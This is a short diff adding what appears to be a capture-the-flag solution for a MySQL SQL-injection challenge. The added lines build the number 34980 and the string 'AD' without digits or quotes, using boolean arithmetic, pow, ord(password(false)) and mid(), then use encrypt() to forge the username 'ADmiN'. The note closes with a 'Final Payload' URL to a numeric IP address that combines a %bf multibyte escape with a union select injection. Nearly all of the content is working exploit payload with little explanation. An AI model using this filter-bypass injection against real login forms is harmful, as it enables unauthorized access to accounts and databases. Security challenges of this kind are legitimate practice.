@@ -1,0 +1,15 @@
+
+34980 = 32768 + 2048 + 42*4 - 4
+pow(true+true,pow(true+true,true+true+true+true)-true)+
+pow(true+true,true+true+true+true+true+true+true+true+true+true+true)+
+ord(password(false))*(true+true+true+true)-
+(true+true+true+true)
+
+encrypt(34980,'AD') = ADmiNzoAPUTsQ
+
+mid(encrypt(34980,'AD'),1,5) = ADmiN
+
+mid(password(false),pow(true+true+true+true,true+true)-true,true+true) = AD
+
+[Final Payload]
+http://52.78.77.229/?id=%bf\&pw=%20union%20select%20mid(encrypt(pow(true%2btrue,pow(true%2btrue,true%2btrue%2btrue%2btrue)-true)%2bpow(true%2btrue,true%2btrue%2btrue%2btrue%2btrue%2btrue%2btrue%2btrue%2btrue%2btrue%2btrue)%2bord(password(false))*(true%2btrue%2btrue%2btrue)-(true%2btrue%2btrue%2btrue),mid(password(false),pow(true%2btrue%2btrue%2btrue,true%2btrue)-true,true%2btrue)),true,true%2btrue%2btrue%2btrue%2btrue),true,true--%20-
